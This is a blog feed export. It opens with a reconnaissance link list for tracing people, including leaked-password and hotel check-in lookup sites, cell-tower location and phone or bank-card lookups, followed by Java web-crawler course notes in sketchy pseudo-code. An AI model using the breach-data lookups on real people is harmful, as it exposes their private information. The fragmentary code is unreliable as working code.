80、运动员技术等级综合查询 http://jsdj.sport.gov.cn/ 81、国家知识产权人才信息查询 http://211.157.104.94:8080/expert/view/person.jhtml 四、驾驶员及车辆信息查询 82、驾驶证行驶证身份证查询 http://www.bitauto.com/weizhang/jiashizheng/suining.html 83、交通违章查询 http://www.weizhang8.cn/ http://chaxun.weizhang8.cn/guanfangwang.php http://www.weizhangwang.com/ http://www.weizhangjilu.com/ http://wz.ieche.com/jtwz.asp http://wz.ieche.com/ http://cha.chelink.com/ 84、车险理赔系统网址 http://www.nia.net.cn/lp_service.asp 85、车险理赔信息查询系统 http://www.bjcxlp.com.cn/ 五、查物品查资产 86、土地市场信息查询 http://www.landchina.com/ 87、专利检索 http://www.sipo.gov.cn/zljsfl/ 88、金马甲资产交易查询 http://www.jinmajia.com/xmjs/ 89、淘宝司法拍卖 https://sf.taobao.com/ 90、条码信息查询 http://www.ancc.org.cn/Service/queryTools/Barcode.aspx 91、中国物品编码中心 http://www.ancc.org.cn/ 92、国际和国内船舶查询 http://www.ccs.org.cn/ccswz/font/fontAction!moudleIndex.do?moudleId=78 93、中国海事船舶查询系统 http://app.cnss.com.cn/sochuan.php 94、房产证查询 http://www.51zzl.com/rcsh/fcz.asp 95、土地证查询 http://www.51zzl.com/jinrong/tudizheng.asp 六、查物流 96、海关电子放行信息查询 http://edi.easipass.com/dataportal/q.do?qn=dp_query_letpas 97、快递物流查询 http://www.56888.net/comm/kuaidi.aspx http://www.spb.gov.cn/yzbmcx/ http://www.ckd.cn/ 七、查发票 98、友商发票查询 http://fapiao.youshang.com/ 99、走114 各地查询链接 http://www.zou114.com/invoice/ 100、114啦 各地查询链接 http://www.114la.com/other/fapiaozw.htm 101、在线查询网 http://fapiao.supfree.net/ 友商数据接口在线查询 102、百度应用 百度搜索中输入：发票真伪查询 可进入查询应用 八、查金融 103、银行卡开户地查询 http://cha.yinhangkadata.com/ 104、中国支付网 http://paynews.net/ 银行卡bin查询、第三方支付机构查询 105、posp.cn http://posp.cn/ 联行号查询、银行卡归属地查询 106、爆料迷支付网 http://cha.baoliaomi.com/ 联行号查询、支付牌照查询、二清pos查询、银行卡bin查询、mcc查询、收单机构号查询、pos代理商查询 107、全民114网 http://www.pplive114.com/ 银行网点查询 108、ATM机网点查询网 http://www.atmji.com/ ATM机网点查询 109、中国银联ATM查询 http://www.unionpayintl.com/cn/serviceCenter/atmResult/ 110、银行网点通 http://www.yhwdt.com/ 行号查询、网点查询 111、爱查网 http://www.2cha.com/ 银行卡归属地查询、手机归属地查询、ip查询 112、银行卡归属地批量查询 http://www.yinhangkadata.com/ 银行卡归属地数据接口、银行卡归属地批量查询软件下载、银行卡归属地在线查询 113、posmcc pos机商户代码查询 http://www.posmcc.com/ 114、pos商户代码查询app下载 http://www.wandoujia.com/apps/com.uuwee.quickmcc 九、查手机 115、爱查（手机、银行卡归属地） http://www.2cha.com/ 116、虚拟运营商查询 http://17000.net.cn/ 117、170手机归属地查询 http://www.im170.com/mobile.html http://www.100170.net/ 118、注册过哪些网站 http://www.zhaohuini.com/ 119、基站查询 http://www.cellid.cn/ http://www.haoservice.com/freeLocation/ http://lbs.juhe.cn/cellmap/ http://www.minigps.net/cellsearch.html http://www.cellmap.cn/page/webgsm2gps.aspx 120、经纬度查询 http://www.gpsspg.com/maps.htm http://map.yanue.net/ http://www.gzhatu.com/jingweidu.html 121、果粉查询 http://www.guofenchaxun.com/iccid/ 122、找果网 http://iccid.zhaoiphone.com/ ****、果粉工具箱 http://iccidchaxun.com/ 124、卡神查询 http://www.chaiccid.com/ 125、手机串号IMEI查询 http://www.numberingplans.com/?page=analysis&amp;amp;sub=imeinr http://www.imei.info/ http://www.imei8.net/ http://www.imeidb.com/ http://www.chalg.com/ http://www.samsung110.com/ http://www.chahtc.com/ 126、百度号码认证平台 http://haoma.baidu.com/query 127、搜狗号码认证平台 http://haoma.sogou.com/rz/ 128、360手机归属地查询 http://cx.shouji.360.cn/ 129、触宝通讯录 http://www.chubao.cn/dialer/index.html 130、电话邦 http://www.dianhua.cn/ 131、电话万能钥匙 http://www.imcaller.com/ 132、腾讯手机管家 http://m.qq.com/download/ 133、刑部11司 http://cop163.com/ 134、领英 https://www.linkedin.com/ 十、查密码查开房 135、查小米 http://mi.ckaifang.com/ 136、sgk98 http://www.sgk98.com/ 137、守夜人 http://www.shouyeren.org/ 138、嗅密码 http://www.xiumima.com/ 139、tasec http://www.tasec.org/ 140、华西安全网 http://cha.hx99.net/ 141、听云 http://tingyun.org/ 十一、采集搜索 142、搜索引擎大全 http://www.sowang.com/link.htm 143、特百度 http://www.tebaidu.com/ 144、虫部落快搜 http://so.chongbuluo.com/ 145、八爪鱼 http://www.bazhuayu.com/download 146、数多多 http://www.dataduoduo.com/?bzy=home 147、114搜索 http://www.114.org/ 148、微信搜索 http://weixin.sogou.com/ 149、人物关系搜索 http://www.sogou.com/tupu/person.html 150、伪基站检测软件下载 https://security.tencent.com/index.php/opensource/detail/10 社会工程学(与人交互) 与人交流的社会工程学]]></content>
      <categories>
        <category>网站/论坛/信息</category>
        <category>信息</category>
        <category>信息收集</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>信息收集</tag>
        <tag>威胁情报</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[天亮爬虫学习笔记03]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A9%E4%BA%AE%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003%2F</url>
    <content type="text"><![CDATA[分布式爬虫 中级版-问题列表-待完善 1.UI 1.1 数据来源不够丰富，目前来源于文件不够灵活。 增加来源： 1)数据库可以添加 2）web界面可以自由添加任务 2.TaskSchedule 2.1 恢复机制进行升级解耦，用redis作为中间存储解耦 恢复机制很麻烦，是由于解耦不当造成的，需要持久化的数据放到了第三方内存数据库中 比如：doneURL,doneTask等都放到了内存中，导致关机或是重启进程均丢失 故要将该性质的数据进行独立存储，则关机或关进程就不需要恢复了 之前的schedule：1）由UIManager存入任务，形成任务池，然后其依据FIFO策略，将任务分发给下载线程。（但由于项目本身的特点，5个页面的url一直是可以快速循环迭代的，所以不必要进行恢复） 2）saveNewsEntityUrlSet：存储历史已入库任务的URL记录，用来作为数据入库时候的判重set使用。 3）监控日志中的当天共采集多少条数据，以及历史共采集多少条数据 持久化中间件选择： 1）mysql：关系型数据库，查询相对较慢，对数据库压力也大 2）redis：内存型数据库，查询块，无压力 1）进程内存和redis各放一份同等的数据，由内存往redis里同步数据 优点：1））简化了恢复过程 缺点：1））同步需要周期，中间会有丢失数据的可能性。如果宕机的话会丢失数据。 2））还依然需要恢复数据到进程内存，因为实际使用还是进程内存的数据 2）直接放在redis中，不在进程内存中放 优点：简单设计简洁 缺点：1））与redis直接通讯效率会低于进程自身内存 2））redis的IO请求会显著提高。会产生一定的redis请求压力 3.Download 3.1 解耦调用流程 将原先的download--&gt;parser--&gt;persistence 改为download--&gt;parser,并将persistence独立出来。 3.2 分布式爬虫 1）由多个独立的进程共同完成一件事情 2）分布式爬虫的设计 *1）master/slave 角色定义/角色称呼 角色对应的功能： master：UIManager，TaskSchedule，PersistenceManager slave：DownloadManger，ParserManager middleware(中间件) 第1个：作为中间媒介人,用来存储master需要下放给slave的任务列表。 第2个：用来存储slave给master返回的解析完的结果对象（NewsItemEntity) *2）无中心化/去中心化 4.Parser 4.1 正则，Jsoup工具类 4.2 新增三个字段：标题，发布时间，URL，作者，来源，正文 则最终成为7个字段，分别为：标题，发布时间，URL，作者，来源，正文，插入时间 差异点： 之前是种子任务，现在是两种任务，一个是种子任务，一个是要采集出来的真正的实体数据 第1种设计方法： 两种任务对于TaskSchedule来讲，相当于平行复制了一份，里面的对象发生了改变 相当于两个池子，分发的时候各自去取不同种类的任务去下载，在解析的时候也要有区分，以及是不是要存储 第2种设计方法： 将2种任务化简成主线程单线程完成种子任务采集，由后边的多线程完成实体数据的采集。 5.Persistence 5.1 mysql版 5.2 elasticsearch版 WebSpiderAdvanced4job001 复制过来之后要修改git 在网页重新搞一个project，然后项目右键-&gt;team-&gt;share.... 然后commit的时候把.文件都不选，其他都选然后注释，commit com.tianliangedu.job001.controller SystemController(); com.tianliangedu.job001.iface.download com.tianliangedu.job001.iface.parser com.tianliangedu.job001.iface.persister DataPersistManager(); //数据持久化管理器 com.tianliangedu.job001.monitor com.tianliangedu.job001.parser com.tianliangedu.job001.persistence com.tianliangedu.job001.pojos com.tianliangedu.job001.pojos.entity com.tianliangedu.job001.schedule com.tianliangedu.job001.ui com.tianliangedu.job001.utils public class SystemController{ //将log4j配置文件放到jar包外边的路径更新 static{ PropertyConfigurator.configure(System.getProperites); } logger //主线程任务采集 psvm(){ //1.起动UIManager,注入种子任务 //2.起动下载程序，解析 //3.起动系统监控管理器 //周期执行 } //addSeedUrlsToTaskSchedule(){ //将给定的种子任务先进行采集和解析，将二级任务传递给任务管理器，去调度 parseSeedUrlsTaskToSchedule(){ //定义种子文件路径 String datafilePath = &quot;&quot;; //将种子任务从种子任务中读取出来，形成种子任务集合 List&lt;UrlTaskPojo&gt; seedUrlPojoList = UIManager(xxx); //将任务不直接放调度器，而是先逐个种子url采集和解析，将解析出来的子任务再添加到TaskSchedule里面去。 for(UrlTaskPojo urlTaskPojo:seedUrlPojoList){ //遍历集合，拿到每一页的URL封装的对象 String htmlSource = downLoadInterface.download(urlTaskPojo.getUrl()); List&lt;NewsItemEntity&gt; itemEnityList = xxparser; for(NewsItemEntity itemEntity:itemEnityList){ sout(itemEntity.toString()); } } } } UIManager{ //实例化一个网页下载接口的实现类，单线程 DownLoadInterface .... start(); } public class DataPersistManager{ //将实现类初始化 public static DataPersistentceInterface persistenceInterface = new DataPersist4MysqlImpl(); public static boolean persist(List&lt;NewsItemEntity&gt; itemList){ boolean flag = persistenceInterface.persist(itemList); } } UrlTaskPojo{ //new private TaskTypeEnum taskType = TaskTypeEnum.ROOT_URL;//默认是根url public static enum TaskTypeEnum{ ROOT_URL,CRAWL_TASK } } HtmlParserManager{ List&lt;UrlTaskPojo&gt; parserHtmlSource4rootUrl(){ return xxx } } NewsItemParserInterface{ //new public List&lt;NewsItemEntity&gt; parserHtmlSource4rootUrl(); } 分布式设计方法： redis： TaskScheduleManager: savedNewsEntityUrlSet pom.xml &lt;!-- https://mvnrepository..... --&gt; redis.clients jedis 2.8.2 RedisOpenUtil{ private Jedis jedis; public static RedisOpenUtil getInstance(){ return new redisOpenUtil = new RedisOpenUtil(xxxx); } setter and getter public RedisOpenUtil(String ip,int port,String password){ //连接本地的Redis服务 jedis = new Jedis(ip,port); jedis.auth(password); } public Jedis getJedis(){ retrun jedis; } public String get(String key){ String val = jedis.get(key); if(val == null){ val = &quot;xxx&quot;; } return val; } public void set(String key,String value){ jedis.set(key,value); } psvm(){ String ip =. int port password RedisOpenUtil redisOpenUtil.set(xx); sout(jedis.ping()); //结果为PONG则是通的 sout(); } } spider.properties: #redis配置参数 redis_ip=xxx redis_port=6379 redis_password=xxx SystemController 静态声明调用配置文件 TaskScheduleManager: //redis工具类初始化 public static RedisOpenUtil redisOpenUtil = RedisOpenUtil.getInstance(); addSavedNewsEntityUrlSet(xx){ redisOpenUtil.getJedis().sadd(uniqUrlSetKey,savedUrl); //getJedis().sismember. 判断key，value是不是在库里面 } //取得其长度 getSavedNewsEntityUrlSetSize(){ getJedis().scard(key); } 缓存穿透： 1.缓存没有命中 原因：往往是缓存冷启动问题；（第一次起动） 解决方法：预计算 缓存不一致： 1.缓存数据与你的之前一般持久化数据不一致了。 原因：代码有bug 清空数据之类的人为导致两者不一致了 分布式设计： spider.properties #定义是master还是slave节点：true是master is_master=true SystemConfigParas 读取爬虫节点角色 boolean is_master SystemController //在第一步之前 if(SystemConfigParas.is_master){ //主节点 //启动系统监控管理器 //周期执行 int circleCounter = 1; while(true){ //添加任务 } }else{ //子节点 //启动下载进程 } TaskScheduleManager //redis中与队列对应的list结构的key声明： public static String todoTaskPojoListKey = &quot;todo_task_pojo_list_key&quot;; redisOpenUtil.getJedis().lpush(); ObjectAndByteArrayConvertor: java对象与字节数组的转化工具类 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(urlTaskPojo); oos.flush(); byte[] objByteArray = baos.toByteArray(); addUrlTaskPojoList(List&lt;UrlPojo&gt; todoAddTaskList){ //将对象转成byte数组存到redis中 for(xx xxx: xxList){ byte[] byteArray = ToByteArray(xxx); redisOpenUtil.getJedis().lpush(todoTaskPojoListKey.getBytes(&quot;utf-8&quot;,byteArray)); } } UrlTaskPojo implements Serializable{//序列化标志口 } es实现： DataPersist4Esimpl persist(对象类){ } pom.xml 5个依赖: esxxx log4j sl4j io.search ... log4j.proerties log4j2.proerties 工具类： TransportClientUtil{ //声明一个client变量 public TransportClient client = null; public TransportClientUtil() throws Exception(){ init(); } //初始化TransportClient public void init() throws Exception(){ /* 配置相关参数，包括集群名称：标识连接哪个es集群，是否开启嗅探 其嗅探功能使用效果并不理想，还是以直接显式添加服务节点 */ Settings settings = Settings.builder() .put(&quot;cluster.name&quot;,&quot;tianliangedu&quot;) .put(&quot;client.transport.sniff&quot;,true); //将参数应用到某个client对象中 } //将指定的map对象索引到指定的索引名称和类型当中 public void addOneDocument(String indexName,String typeName,Map map){ //通过map定义kv结构数据对象 Map xxx //将数据发送到服务器端 this.client.prepareIndex(indexName,typeName,xx) .execute().actionGet(); } }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>爬虫</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>编程</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[天亮爬虫学习笔记02]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A9%E4%BA%AE%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002%2F</url>
    <content type="text"><![CDATA[实时新闻采集器 天亮爬虫篇--中级篇 今日头条早些年完全是爬虫，现在是厂家来爬它 maven WebSpiderMiddle4Job001(); &lt;!-- 仓库源配置 --&gt; nexus aliyun &lt;!-- 依赖包 --&gt; &lt;dependencies&gt; &lt;!-- 项目打包与发布 --&gt; com.tianliangedu.job001.ui UIManager(); com.tianliangedu.job001.schedule TaskScheduleManager(); //负责任务调度 com.tianliangedu.job001.download com.tianliangedu.job001.parser com.tianliangedu.job001.persistence com.tianliangedu.job001.utils StaticValue(); //存放项目当中的静态变量 ReadConfigUtil(); //读取配置文件的工具类,既支持直接读取classpath下的，也支持读取外置配置文件 IOUtil(); WebPageDownloadUtil(); //用于下载给定任意网址后对应的html代码 WebCharsetDetectorUtil(); //拿charset RegexUtil(); com.tianliangedu.job001.pojos 放不持久化类 UrlTaskPojo(); com.tianliangedu.job001.pojos.entity 与数据库一一对应起来 com.tianliangedu.job001.controller seeds.txt 不放在resouces里面 resources //git化管理 192.168.1.14 在gitlab，-&gt;your projects挑一个点进去-&gt; groups -&gt;挑一个-&gt;new project -&gt;project name:WebSpiderMiddle4jonb001 Project desription(optional): 将源码xxx与gitlab项目进行正规的版本化操作 复制http //git init eclipse-&gt;右键项目-&gt;Team-&gt;Share Project-&gt;Git-&gt; 选中Use or create ... 取消里面的项目选中状态 点击Create Repository，来创建本地版本库-&gt;Finish 右键项目-&gt;Team-&gt;Commit... 勾选pom.xml 上方message写上：项目环境搭建与包初始化,项目的第一次提交 commit 右键项目-&gt;Team-&gt;Remote-&gt;Push Source ref: xxx/master. (在本地默认是master) Destination ref: xxx/dev_v1(存放的位置) Add. -&gt;next-&gt;finish 自定义编辑author 注释方法 种子文件读取工具类： public class UIManager{ public UrlTaskPojo getRootUrlByDirect(){ return UrlTaskPojo(StaticValue.rootTitle,StataicValue.rootUrl); } public UrlTaskPojo getRootUrlByStaticValue(){ return new UrlTaskPojo(StaticValue.rootTitle,StataicValue.rootUrl); } public List&lt;UrlTaskPojo&gt; getRootUrlBySeedFile(String dataFilePath,boolean isClassPath){ //这里改为封装类，里面至少包含title,url List&lt;String&gt; lineList = IOUtil.readFileToList(dataFilePath,isClassPath,StaticValue.defaultEncoding); List&lt;UrlTaskPojo&gt; resultTaskPojo = xx; for(String line:lineList){ line = line.trim(); if(line.length() &gt; 0 &amp;&amp; !line.startsWith(&quot;#&quot;)){ String[] columnArray = line.split(&quot;\\s&quot;); if(columnArray.length == 2){ UrlTaskPojo tempPojo = new UrlTaskPojo(columnArray[0].trim(),columnArray[1].trim()); resultTaskPojo.add(tempPojo); }else{ sout.err(); throw new Exception(&quot;&quot;); } } } return resultTaskPojo; } public static void addSeedurlsToTaskSchedule(){ xxx } } public class StaticValue{ public static String rootUrl = &quot;http://xxx&quot;; //默认读取文件的编码设置 defaultEncoding = &quot;utf-8&quot;; rootTitle = &quot;&quot;; //分隔符号静态设置 sep_next_ling = &quot;\n&quot;; } //种子文件放在哪里？ //resource里面的话jar包不解它就会没有，这里分内置和外置 seeds.txt #这是我的种子文件，请按格式添加 中国青年网-国内新闻 http://news.youth.cn/gn/ public class ReadConfigUtil{ psvm(){ //1.配置文件路径 String configPath = &quot;seeds.txt&quot;; //2.配置文件的读取模式,是classpath还是系统路径 boolean isClassPath = true; //3.正式进行文件读取 InputStream is = ReadConfigUtil.class.getClassLoader().getResourceAsStream(configPath); 流读取 } } public class ReadConfigUtil{ public static List&lt;String&gt; readFileToList(String filePath,boolean isClassPath,String charset){ InputStream is = null; if(isClassPath){ //3.正式进行文件读取 is = ReadConfigUtil.class.getClassLoader().getResourceAsStream(filePath); }else{ is = new FileInputStream(filePath); } 流读取 return lineList; } psvm() throws IOException{ //1.数据配置文件路径 String configPath = &quot;seeds.txt&quot;; //2.数据配置文件的读取模式,是classpath还是系统路径 boolean isClassPath = true; //3.正式进行文件读取 List&lt;String&gt; lineList = readFileToList(configPath,isClassPath,StaticValue.encoding); 流读取 } } 放在resources里面的话会打包里，一般不好修改，数据大部分是外置的,所以放在项目最外面即可,即非classPath if(isClassPath){ //3.正式进行文件读取 is = ReadConfigUtil.class.getClassLoader().getResourceAsStream(filePath); }else{ is = new FileInputStream(filePath); } public class UrlTaskPojo{ private String title; private String url; public UrlTaskPojo(){ } public UrlTaskPojo(String title,String url){ xxxx } setter and getter } public class TaskScheduleManager{ public static LinkedList&lt;UrlTaskPojo&gt; todoTaskPojoList = new LinkedList &lt;UrlTaskPojo&gt;(); //优先级高的从头部加，低的从尾部加 public static LinkedList&lt;UrlTaskPojo&gt; doneTaskPojoList = new LinkedList &lt;UrlTaskPojo&gt;(); public static void addUrlTaskPojoList(List&lt;UrlTaskPojo&gt; todoTaskList){ todoTaskPojoList.addAll(todoTaskList); } public static void addOneUrlTaskPojoList(UrlTaskPojo todoTask){ todoTaskPojoList.add(todoTask); } public static void addDoneUrlTaskPojoList(UrlTaskPojo todoTask){ doneTaskPojoList.add(todoTask); } public static void removeUrlTaskPojoList(List&lt;UrlTaskPojo&gt; removeTaskList){ todoTaskPojoList.removeAll(removeTaskList); } public static void removeOneUrlTaskPojoList(UrlTaskPojo removeTaskList){ todoTaskPojoList.remove(removeTaskList); } public static UrlTaskPojo take(){ UrlTaskPojo taskPojo = todoTaskPojoList.pollFirst(); return taskPojo; } } URL_Connection 下载html: public class WebPageDownloadUtil{ psvm(){ url = &quot;&quot; URL urlObj = new URL(url); charset URLConnection urlConnection = urlObj.openConnection(); HttpURLConnection xxx InputStream is = urlConnection.getInputStream(); 读取流 } } public class WebCharsetDetectorUtil{ psvm(){ //header寻找charset urlConnection.getHeader.... map //当header和meta冲突的时候以header为准。 //在header找不到一般在meta找 String findCharset = null; header. key value //如果header没找到，则启用meta寻找 if(findCharset == null){ is while((line=br.readLine())!=null){ line = line.toLowerCase(); } } } } public class RegexUtil{ getMatchText(String input ,String regex,int groupIndex){ //String line = &quot;xxx&quot;; //String regex = &quot;charset=[\&quot;]*([\\s\\S]*?)[\&quot;&gt;]; Patten Matcher if(matcher.find()){ return matcher.group(groupIndex); //根据括号来看的组 } return findCharset==null?xx:xx; } } //24集 多线程 com.tianliangedu.job001.ui UIManager(); com.tianliangedu.job001.schedule TaskScheduleManager(); //负责任务调度 DownLoadManager(); com.tianliangedu.job001.download com.tianliangedu.job001.iface.parser NewsItemParserInterface(); com.tianliangedu.job001.iface.download DownloadInterface(); DownLoadRunnable(); 下载线程 com.tianliangedu.job001.parser HtmlParserManager(); com.tianliangedu.job001.persistence com.tianliangedu.job001.utils StaticValue(); //存放项目当中的静态变量 ReadConfigUtil(); //读取配置文件的工具类,既支持直接读取classpath下的，也支持读取外置配置文件 IOUtil(); WebPageDownloadUtil(); //用于下载给定任意网址后对应的html代码 WebCharsetDetectorUtil(); //拿charset RegexUtil(); ReadConfigUtil(); //读配置文件的工具类 SystemConfigParas(); //系统配置参数工具类 com.tianliangedu.job001.pojos 放不持久化类 UrlTaskPojo(); com.tianliangedu.job001.pojos.entity 与数据库一一对应起来 com.tianliangedu.job001.controller resources spider.properties 1.继承Thread 优点：简单，直接，可起动 缺点：java是单继承，影响本类的后续继承扩展性 2.实现Runnable接口 优点：实现接口，对后续继承扩展性无影响 缺点：不如Thread直接 3.线程的状态 新建-&gt;就绪-&gt;运行-&gt;阻塞（等待/挂起）-&gt;死亡 public class DownLoadRunnable implements Runnable{ //线程可以运行的标志变量 private boolean enableRunningFlag = true; //static对类而言一停全停一跑全跑 getter and setter //线程运行的入口方法 @Override public void run(){ while(enableRunningFlag){ UrlTaskPojo taskPojo = TaskscheduleManager.take(); if(taskPojo!=null){ String html; if(html != null){ }else{ } }else{ sout(&quot;none receive seed&quot;); Thread.sleep(2); } sout(); } } } ThreadGroup 使用示例： ThreadGroup threadGroup = new ThreadGroup(&quot;spider_group&quot;); int count = 5; for(int i = 1 ; i &lt;= count ; i ++){ DownloadRunnable oneRunnable = new DownloadRunnable(&quot;&quot;); new Thread(threadGroup,oneRunnable,&quot;thread_&quot; + i).start(); } Thread[] threadArray = new Thread[threadGroup.activeCount()]; for(int i=0;i&lt;3;i++){//检测3次 Thread.sleep(3); sout(threadGroup.activeCount()); threadGroup.enumerate(threadArray); for(Thread t:threadArray){ sout(); } } 集合方法管理线程组： 标志位在run里面结束 DownloadManager{ for(Runnable oneRun:runnableList){ DownloadRunnable tmepObj = (DownloadRunnable)oneRun; tmpObj.setEnableRunningFlag(false);//管理线程结束 sout(); } } public class DownLoadManager{ //线程组初始化 public static ThreadGroup_tGroup = new ThreadGroup(&quot;下载线程组&quot;); //线程组之Runnable管理的集合对象 public static List&lt;DownLoadRunnable&gt; runnableList = new ArrayList&lt;&gt;(); //开启多少个下载线程 public static void start(){ int consumerNumber = 3; List&lt;Runnable&gt; runnableList = new ArrayList&lt;Runnable&gt;(); for(int i = 1 ; i &lt;= consumerNumber ; i++){ DownLoadRunnable oneRunnable = new DownLoadRunnable(&quot;&quot;); new Thread(tGroup,oneRunnable,&quot;&quot;); runnableList.add(oneRunnable); } } //获取线程的状态信息-多少个活着的下载线程 public static int getActiveDownLoadThreads(){ return tGroup.activeCount(); } //一共初始化了多少个线程 public static int getInitDownLoadThreads(){ return initConsumerNumber; } //停止掉所有线程 public static void stopAllThreads(){ for(DownLoadRunnable runnable:runnableList){ runnable.setEnableRunningFlag(false); } } } 配置文件工具类： spider.properties utf-8 # 爬虫的配置文件 #针对download设置的配置参数 init_consumer_number=3 #每次遇到空任务时候的睡眠时间，单位为秒 sleep_time_for_empty=2000 //调用 ReadConfigUtil public class ReadConfigUtil{ //初始化javase自带的配置文件读取工具类 private Properties configObj = new Properties(); public ReadConfigUtil(String configFilePath){ //配置文件读取顺序，1:系统文件路径，2.classpath路径 File configFile = new File(configFilePath); Reader reader = null; InputStream is = null; if(configFile.exists()){ is = new FileInputStream(configFile); reader = new InputSteamreader(is); configObj.load(fis); }else{ is = ReadConfigUtil.class.getClassLoader.... reader = new ...; configObj.load(is); }finally{ is.close(); } } public String getValue(String key){ return configObj.getProperty(key); } psvm(){ String xxxpath = &quot;spider.properties&quot;; .... } } public class SystemConfigParas{ //初始化参数读取的工具类实例 public static ReadConfigUtil configUtil = null; static{ configUtil = new ReadConfigUtil(&quot;spider.properties&quot;); } //集中读取download相关的参数 public static int init_consumer_number = ....getValue(); sleep_time_for_empty } public class HtmlParserManager{ psvm(){ String url = &quot;&quot;; String htmlSource = &quot;&quot;; //1.先拿到小范围的数据块 String blockRegex = &quot;&lt;div class=\&quot;main_1\&quot;&gt;([\\s\\S]*)&lt;div class=\&quot;main_r\&quot;&quot;; getMatchText(htmlSource,blockRegex,0); //2.开始逐条拿匹配块 while(matcher.find()){ //先获取准确标题 String titleRegex = &quot;&quot;; String title = xxxx; ... } sout(); } } public class RegexUtil{ public static String getMatchText(String input ,String regex,int groupIndex){ Pattern Matcher if(matcher.find()){ return matcher.group(groupIndex); } return null; } } title postTimeString. //发布时间 sourceURL insertDate //插入时间 postDateObj //发布时间另一种形式 public interface NewsItemParserInterface{ } String getChildElementValue(Element element,int childIndex,ContentSelectType contype){ String value = null; switch(contentType){ case OUTHER_HTML: value = element.child(childIndex).outerHtml(); break; case... } } com.tianliangedu.job001.iface.persistence public class DataPersistenceInterface{ //数据持久化接口类 private DataBaseUtil dataBaseUtil; public DataPersistenceInterface(){ } //批量保存 public boolean persist(List&lt;NewsItemEntity&gt; itemEntity); //单条保存 public boolean persist(NewsItemEntity itemEntity); } DataPersist4MySqlImpl implements xxxInterface{ @Override public boolean persist(NewsItemEntity itemEntity){ DataBaseUtil dbutil = new DataBaseUtil(driver,url,username,password); xxxx ps.executeUpdate(); } } //乱码解决： show variables like &apos;character_set%&apos; mysql配置： my-default.ini default-character-set=utf8 init_connect=&apos;set names utf8&apos; my.ini character-set-server=utf8 jdbc参数： mybatis.proerties //TODO 线程问题 //TODO //监控日志管理系统 MonitorManager{ }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>爬虫</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>编程</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[天亮爬虫学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A9%E4%BA%AE%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[05实时新闻采集 天亮爬虫篇--初级篇 五大门户：新浪新闻，网易，腾讯，搜狐，凤凰 中国青年网是国内用户群体最广泛，体量最大，权威度最高，集新闻编撰，发布，传播为一体的新闻数据中心。 http://news.youth.cn/gn/ 采集要求： 数据字段要求 新闻标题，发布时间，数据插入数据库的时间 首次采集 因为新闻数据量巨大，机器和带宽有限，故只采集前5页即可，并存储到mysql数据库中 增量采集 当首次采集的5页完成后，定时周期性每隔1分钟增量采集一次，将新出现的新闻条目采集下去，并存储到mysql数据库即可 采集日志输出要求 日志当中，要能一直输出当前共采集多少条新闻，当天共采集多少条新闻 主要思路： 通过javase+maven+httpclient数据集组件+正则+mysql综合实现 数据采集器的开发流程：主要包括提交任务的用户接口层，任务调度层，网络爬取层，数据解析层，数据持久化层，共5个主要层，再循环至任务调度层的过程 模块间解耦设计，模块间通过类或方法来衔接串联，最终形成完整的系统。 //任务调度层：解决先后采集等策略问题 //递归采集分深度优先和广度优先 主要考点： 项目分析与开发过程熟悉 javase程序设计基础 面向对象程序设计 maven项目构建和开发 httpclient api学习和使用 正则 mysql操作 爬虫相关博文链接： https://blog.csdn.net/erliang20088/article/details/45790263?locationNum=7&amp;fps=1 https://blog.csdn.net/erliang20088/article/details/45790201 https://blog.csdn.net/erliang20088/article/details/45790103 https://blog.csdn.net/erliang20088/article/details/45790253 简单页面：是指没有异步请求的页面。 nlp: 句法分析 itp 哈工大 数据挖掘： 基于nlp基础 HttpURLConnection底层是socket HttpClient底层是httpURLConnection SimpleYouthNewsSpider &lt;!-- 首先配置仓库的服务器位置，首选阿里云，也可以配置镜像方式 --&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;name&gt;Nexus iliyun&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/xxxx&lt;/url&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;dependencies&gt; &lt;!-- 引入hadoop-cli-2.7.4依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-client&lt;/artifactId&gt; &lt;version&gt;2.7.4&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; hive ... &lt;/dependencies&gt; &lt;build&gt;打包的&lt;/build&gt; package一般是5层 com.tl.spider.ui UIManager(); com.tl.spider.schedule com.tl.spider.download com.tl.spider.parser com.tl.spider.utils resources seeds.txt /* 负责爬虫系统对外开放接口的设计 */ public class UIManager{ //拿到系统运行的种子 public static String getSeedUrl(){ return &quot;http://news.youth.cn/gn/&quot;; } //拿到系统运行的种子通过文件加载的方式 public static List&lt;String&gt; getSeedUrlFromFile(){ String seedFilePath = &quot;seeds.txt&quot;; List&lt;String&gt; seedUrlList=FileOperatorUtil.getList(); } public static String readFromFile(String filePath,String charset){ File fileObj = new File(filePath); FileInputStream fis = new FileInputStream(fileObj); InputStreamReader isr = new InputStreamReader(fis); BufferedReader br = new BufferedReader(isr); StringBuilder stringBuilder = new StringBuilder(); String temp = null; int lineCounter=0;// StringBuilder会多一行 while(temp=br.readLine()!=null){ if(lineCounter &gt; 0){ 